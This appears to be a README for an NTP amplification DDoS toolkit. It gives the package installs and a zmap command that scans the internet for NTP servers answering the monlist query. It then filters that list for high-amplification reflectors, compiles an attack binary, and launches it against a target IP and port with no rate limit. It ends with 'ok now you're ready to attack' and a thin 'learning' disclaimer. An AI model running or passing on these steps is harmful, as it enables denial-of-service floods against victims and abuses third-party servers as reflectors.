this is a NTP-AMP script for cyber security learning

operating system：centOS 7

prepare repositorys：Enter the command below

-----------------------------------------------
yum install gcc libcap  libpcap libpcap-devel screen php dstat cmake gmp gmp-devel gengetopt byacc flex git json-c
yum -y install zmap
--------------------------------------------------

Upload ntpchecker and ntp_123_monlist.pkt to your server
Enter the command below to start scanning agent list（it wil take a looong time so pls be patient）:

-------------------------------------------------------------------------------------------------
screen zmap -p 123 -M udp --probe-args=file:/root/ntp_123_monlist.pkt -o monlist_fingerprint.txt
---------------------------------------------------------------------------------------------------

give ntpchecker 777 permission：
chmod 777 ntpchecker

Operational inspection：
screen ./ntpchecker monlist_fingerprint.txt step1.txt 1 0 1

filter list:
awk '$2>419{print $1}' step1.txt | sort -n | uniq | sort -R > ntpamp.txt

Compilation and attack:
yum install gcc libcap libpcap libpcap-devel 
gcc -lpthread ntp.c -lpcap -o ntp 
 
 ATTACK:
./ntp ip port list(ntpamp.txt) thread ppslimit(-1=no limit) attacktime(second)
example: ./ntp 127.0.0.1 80 ntpamp.list 1500 -1 600
 ok now you're ready to attack
 this script is just for cyber attack learning and pls don't be evil
 
